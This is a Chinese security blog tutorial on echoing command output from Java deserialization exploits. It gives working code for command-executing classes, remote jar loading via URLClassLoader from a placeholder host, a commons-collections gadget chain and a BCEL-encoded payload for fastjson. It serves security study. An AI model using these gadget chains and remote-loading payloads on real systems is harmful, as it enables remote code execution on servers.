<!DOCTYPE html>
<html lang="cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"cangqingzhe.github.io","root":"/","scheme":"Muse","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="知行合一">
<meta property="og:type" content="website">
<meta property="og:title" content="藏青&#39;s BLOG">
<meta property="og:url" content="https://cangqingzhe.github.io/index.html">
<meta property="og:site_name" content="藏青&#39;s BLOG">
<meta property="og:description" content="知行合一">
<meta property="og:locale" content="cn">
<meta property="article:author" content="藏青">
<meta property="article:tag" content="渗透 内网 代码审计">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://cangqingzhe.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false
  };
</script>

  <title>藏青's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">藏青's BLOG</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">JAVA反序列化回显学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-12-17 15:59:04" itemprop="dateCreated datePublished" datetime="2020-12-17T15:59:04+08:00">2020-12-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-12-24 09:50:57" itemprop="dateModified" datetime="2020-12-24T09:50:57+08:00">2020-12-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java/" itemprop="url" rel="index">
                    <span itemprop="name">java</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">近年来出现的很多JAVA的漏洞都是无回显的漏洞，因此了解如何能让本身不回显的漏洞回显成为很多大佬研究的内容，本文将带着大家一起学习JAVA反序列化漏洞的回显方案。</span><br></pre></td></tr></table></figure>

<h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>​        defineClass可以将byte[]转换为Class类，如下所示defineClass会接收我们传入的name,byte[],长度等参数，最终会返回给我们一个Class类的对象。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201217174607641.png" alt="image-20201217174607641"></p>
<p>​        也就是说我们不仅可以通过ClassLoader.loadClass（）来获取Class类，也可以将一个类转化为byte[],通过defineClass我们就可以获取到这个类。</p>
<p>​        我这里写了个测试代码来帮助理解，首先我们创建一个test666类，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line">public class test666 &#123;</span><br><span class="line">    public test666(String cmd) throws Exception &#123;</span><br><span class="line">        InputStream stream &#x3D; (new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;&#x2F;c&quot;, cmd&#125;)).start().getInputStream();</span><br><span class="line">        InputStreamReader reader &#x3D; new InputStreamReader(stream, Charset.forName(&quot;gbk&quot;));</span><br><span class="line">        BufferedReader bufferedReader &#x3D; new BufferedReader(reader);</span><br><span class="line">        StringBuffer buffer &#x3D; new StringBuffer();</span><br><span class="line">        String line &#x3D; null;</span><br><span class="line"></span><br><span class="line">        while((line &#x3D; bufferedReader.readLine()) !&#x3D; null) &#123;</span><br><span class="line">            buffer.append(line).append(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        throw new Exception(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        可以看到在我们的有参构造方法中，接收了cmd参数放到ProcessBuilder中执行将执行的结果通过exception异常来回显出来，我们将test666这个类编译，再编写一个类去将test666.class中的内容读取并存入到字节数组中，通过defineClass来获取test666这个类的Class对象，再通过newInstance来调用它的构造方法并传入参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line">public class defineClassTest extends  ClassLoader&#123;</span><br><span class="line">    public static &lt;defineClass&gt; void main(String[] args) throws IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        File file&#x3D;new File(&quot;C:\\Users\\admin\\Desktop\\test666.class&quot;);</span><br><span class="line">        BufferedInputStream bis &#x3D; null;</span><br><span class="line">        ByteArrayOutputStream baos &#x3D; new ByteArrayOutputStream();</span><br><span class="line">        FileInputStream in &#x3D;new FileInputStream(file);</span><br><span class="line">        bis &#x3D; new BufferedInputStream(in);</span><br><span class="line">        byte[] buf &#x3D; new byte[1024];</span><br><span class="line">        int len &#x3D; 0;</span><br><span class="line">        while ((len &#x3D; in.read(buf)) !&#x3D; -1) &#123;</span><br><span class="line">            baos.write(buf, 0, len);</span><br><span class="line">        &#125;</span><br><span class="line">        byte[] buffer &#x3D; baos.toByteArray();</span><br><span class="line">        defineClassTest defineclasstest &#x3D; new defineClassTest();</span><br><span class="line">        Class cls &#x3D; defineclasstest.defineClass(&quot;test666&quot;,buffer,0,buffer.length);</span><br><span class="line">        cls.getConstructor(String.class).newInstance(&quot;ipconfig&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        执行结果如下，可以看到我们已经将命令执行的结果打印出了。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201217200921594.png" alt="image-20201217200921594"></p>
<h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p>​        我们也可以使用URLClassLoader来加载远程的恶意类执行命令并获取回显,首先将我们生成的恶意类打包并放置到远程服务器上。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218101624866.png" alt="image-20201218101624866"></p>
<p>​        编写如下代码通过URLClassLoader加载远程的jar包执行命令并获取回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line">public class urlget &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            URLClassLoader loader&#x3D;new URLClassLoader(new URL[]&#123;new URL(&quot;http:&#x2F;&#x2F;xxx:88&#x2F;test666.jar&quot;)&#125;);</span><br><span class="line">            Class cls &#x3D; loader.loadClass(&quot;test666&quot;);</span><br><span class="line">            cls.getConstructor(String.class).newInstance(&quot;ipconfig&quot;);</span><br><span class="line">        &#125; catch (MalformedURLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218103236476.png" alt="image-20201218103236476"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218103258089.png" alt="image-20201218103258089"></p>
<p>​        URLClassLoader回显方案在commons-collections利用链下的利用方式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class commonsTest &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(java.net.URLClassLoader.class),</span><br><span class="line"></span><br><span class="line">                new InvokerTransformer(&quot;getConstructor&quot;,</span><br><span class="line">                        new Class[] &#123; Class[].class &#125;,</span><br><span class="line">                        new Object[] &#123; new Class[] &#123; java.net.URL[].class &#125; &#125;),</span><br><span class="line"></span><br><span class="line">                new InvokerTransformer(</span><br><span class="line">                        &quot;newInstance&quot;,</span><br><span class="line">                        new Class[] &#123; Object[].class &#125;,</span><br><span class="line">                        new Object[] &#123; new Object[] &#123; new java.net.URL[] &#123; new java.net.URL(</span><br><span class="line">                                &quot;http:&#x2F;&#x2F;xxxxx:88&#x2F;test666.jar&quot;) &#125; &#125; &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;loadClass&quot;,</span><br><span class="line">                        new Class[] &#123; String.class &#125;, new Object[] &#123; &quot;test666&quot; &#125;),</span><br><span class="line"></span><br><span class="line">                new InvokerTransformer(&quot;getConstructor&quot;,</span><br><span class="line">                        new Class[] &#123; Class[].class &#125;,</span><br><span class="line">                        new Object[] &#123; new Class[] &#123; String.class &#125; &#125;),</span><br><span class="line"></span><br><span class="line">                new InvokerTransformer(&quot;newInstance&quot;,</span><br><span class="line">                        new Class[] &#123; Object[].class &#125;,</span><br><span class="line">                        new Object[] &#123; new String[] &#123; &quot;ipconfig&quot; &#125; &#125;),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">        Transformer transformerChain &#x3D; new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;创建Map并绑定transformerChain</span><br><span class="line">        Map innerMap &#x3D; new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map outerMap &#x3D; TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;触发漏洞</span><br><span class="line">        Map.Entry onlyElement &#x3D; (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(&quot;foobar&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218105916926.png" alt="image-20201218105916926"></p>
<h3 id="fastjson回显"><a href="#fastjson回显" class="headerlink" title="fastjson回显"></a>fastjson回显</h3><p>​        在fastjson的回显利用方案中，需要将我们的恶意类经过BCEL编码后传入，经过查阅资料fastjson回显的利用方案最终是因为调用了forName方法，而forName在调用的过程中会去执行static静态代码块，所以我们需要将我们的利用代码写在静态代码块中,由于在静态代码块中调用了方法，所以被调用的方法也要用static来修饰。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line">public class test888 &#123;</span><br><span class="line">    static&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            exec(&quot;ipconfig&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void exec(String cmd) throws Exception &#123;</span><br><span class="line">        InputStream stream &#x3D; (new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;&#x2F;c&quot;, cmd&#125;)).start().getInputStream();</span><br><span class="line">        InputStreamReader reader&#x3D;new InputStreamReader(stream, Charset.forName(&quot;gbk&quot;));</span><br><span class="line">        BufferedReader bufferedReader &#x3D;new BufferedReader(reader);</span><br><span class="line">        StringBuffer buffer&#x3D;new StringBuffer();</span><br><span class="line">        String line&#x3D;null;</span><br><span class="line">        while((line&#x3D;bufferedReader.readLine())!&#x3D;null)&#123;</span><br><span class="line">            buffer.append(line).append(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        throw  new Exception(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        编译上面的代码，我们可以获取到test888.class这个类，下面我们将这个类进行处理，转换为BCEL编码，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Path;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class BCELencode &#123;</span><br><span class="line">    public static void main(String []args) throws Exception&#123;</span><br><span class="line">        Path path &#x3D; Paths.get(&quot;C:\\Users\\admin\\xxx\\test888.class&quot;);   &#x2F;&#x2F;文件绝对路径</span><br><span class="line">        byte[] data &#x3D; Files.readAllBytes(path);</span><br><span class="line">        String s &#x3D;  Utility.encode(data,true);</span><br><span class="line">        System.out.print(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218115406847.png" alt="image-20201218115406847"></p>
<p>​        我们可以编写如下代码测试能否利用<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> 加载我们的恶意类执行命令,测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public class pwn &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        String classname&#x3D;&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuU$5dw$d3F$Q$bdk$cb$5eY$uqb$e7$D$93$94RJ$c1$J$c1$a6$40I$9a$844$q$85$f2$a1$E$g$a7$a1$wM$8b$y$af$j$r$8e$e4$p$cb$3d$fc$p$9ey$b19$f5$a1$7d$ebC$ffI$ffDaVv$9c$bav$fc$b0$ab$99$bd3$9e$7bgV$fa$fb$df$df$ff$Ap$HG$gfp$8fc$8d$e3$h$V$eb$w$eek$88$60C$$$9b$g$be$c5$D$8e$87$w$be$d3$f0$I$8f5$q$f0$84$e3$a9$86$R$Y$i$5b$g$92$b8$t$8dm$f9$f4L$c5s$8e$ef$e5$e3$8e$86$J$UT$ecj$b8$80$l$a4$b1$c7$f1$82$e3G$86$f8$aa$e3$3a$c1$gC4$3b$b7$c7$a0lz$r$c1$904$iWl7$8e$8b$c2$df$b5$8aU$f2$a4$M$cf$b6$aa$7b$96$efH$bb$ebT$82$D$a7$ce$900$CQ$P$96$96$96V$c8$r$5e$L$9ba2k$iZ$bfY$f9$aa$e5V$f2$85$c0w$dc$ca$8a$cc$l$b5$8fK2$d9$c0$nUR$P$7ca$jSl$e7$d4$f1$f2$8f$ddZ$p$u$84n$J$a0$bd$q$7c$86$99a$80$9d$f0$90$60$a3$c5F$b9$y$7cQ$da$e9$c2$cf$f7$e0$h$7d$t2e$H$db$c3$fc$a7$a2$OV2$aa$92$W$M$p$85$c0$b2$8f$b6$acZ$c8$9d$ba$c3aR$_H$7eR$9eA$7b$f0$da$W$b5$c0$f1$5c$SD$5d$b5$ab$5dY$99$e8$R$K$93$f7$60$x$d4$h$K$xx$N$df$W$P$j$v$a7$de$951$t$e1$3af$f1$J$Vv$g$fa$dc$f7lQ$afo4$9cj$c8k$ec$ff$r3p$927G$j$60$88$e4m$99$e1$t$j$_$f13$c7$be$8e_$f0$xC$e6L$e5$a87$95$e2$R$c7$x$j$W$8a2$96$da85$5c9yZ$3a9$j$d0L$87$40YG$F$HD_cH$Pa$af$c3$91$98Y$5c$n$b5$9c$9a$ed$b9e$a7$a2$e3s$5c$d1q$uy$f3$ae$W$7d4$9f$V$P$85$j$9cd$ecgA$e5d_$O$l$baX$3d$b0$fc$40$O$e5$9c1$m$tux$7c$c0IST$RA_$f6$e9$93$e0$81$b9$ec$b4$c8$r$bf$7d$60$f9u$R$e47$3b$3b$b1$u$7b$fe$b6uL$fd$c8$N$bb$Q$c6Y$91$94$f5Vv$e8$df$9d$j$o$99$a6O$83$ba3$$$bd$aa$bc8F8$c5$T$7d$S$9c$de$3d$abV$T$$$b5t$e1$ec2$87$dd$N5$f0NF$_Y$a3$3d$I$_$c9$aeo$d9$C$9f$d1$bbf$G$f2$X$F$93$c3L$ebE$b2$f2$b43$dac$f3$z$b0$b7$f4$Q$c1$a7$b4$c6Cg$i$97h$d5$3b$AJq$99$f6$84$i$LBQ0S$I$R$t$dfa$h$R3$fe$kQ3$9aR$K$a6$92$8a$V$cc$d8$7c$a1$85x$T$bc$J$d5h$pa$5eOi$efp$ae$F$7d$ab$8d$Rs$a1$85$d1$ed6$92f$Lc$cb$K$5b$8e$ddhb$dc$5c$8e$fd$85tF$c9$c4$9aH$a5$d2$b4$bcx$f3$e1$9f6$s$cc$8c$d2$c4d$LS$7f$86$Ed$85$97$a1$d2$9a$a4$K$c7$90$c38$W$91$c2$3a$d2$d8$a4$f7$e9$W$s$b1$8f$e9$b0$fa$b5N$85$f8$CWi$bf$84$t$b8$86$y1$caa$Vs$98$t$s$8b$b8$8d$ebX$a0$bc$ebd$df$a0$T$85$b2$5c$pi$ae$S$eb$9b$U5$8b$c8$Hr$c59$be$e4$b8$c5q$9b$e3$O$c7Wd$C$Z$dc$r$84B$Z$t$a8$a2$c5$9e$b0$fb$5daGS$d3$efp$fe$N$d4$a7$f3Md$dev$b5T$J$dd$e11E$96T5F$3a$ab$90$l$91s$f4$cd$Y$e9$v$9f$a0$dcK$f8$9a$yY$JG$e4$R$c7$b2$fc$bb$95$b0Y$ab$l$B$e8$60$97$T$ac$G$A$Ad&quot;;</span><br><span class="line">        ClassLoader cls&#x3D;new com.sun.org.apache.bcel.internal.util.ClassLoader();</span><br><span class="line">        Class.forName(classname,true,cls);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218134951663.png" alt="image-20201218134951663"></p>
<p>​        简单分析一下com.sun.org.apache.bcel.internal.util.ClassLoader的forName方法是如何执行的。</p>
<p>​        跟进forName方法，首先获取SecurityManager实例，获取实例为空后会调用forName0这个方法。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140341587.png" alt="image-20201218140341587"></p>
<p>​        但是forName0是native层的代码，所以获取不到具体的执行细节。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140555599.png" alt="image-20201218140555599"></p>
<p>​        但继续跟进会调用java.lang.ClassLoader.loadClass方法</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140645454.png" alt="image-20201218140645454"></p>
<p>​        继续跟进调用，首先尝试通过class_name获取Class实例，这里没有获取到</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140742726.png" alt="image-20201218140742726"></p>
<p>​        当没有获取到Class实例，会查看class_name中是否包含<code>$$BCEL$$</code>,如果包含会执行createClass方法。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201218140906671.png" alt="image-20201218140906671"></p>
<p>​        在createClass中会以<code>$$BCEL$$</code>进行分割，取出real_name，将real_name中的内容解码成bytes形式，并获取ClassParser解析器，解析出test888这个类。</p>
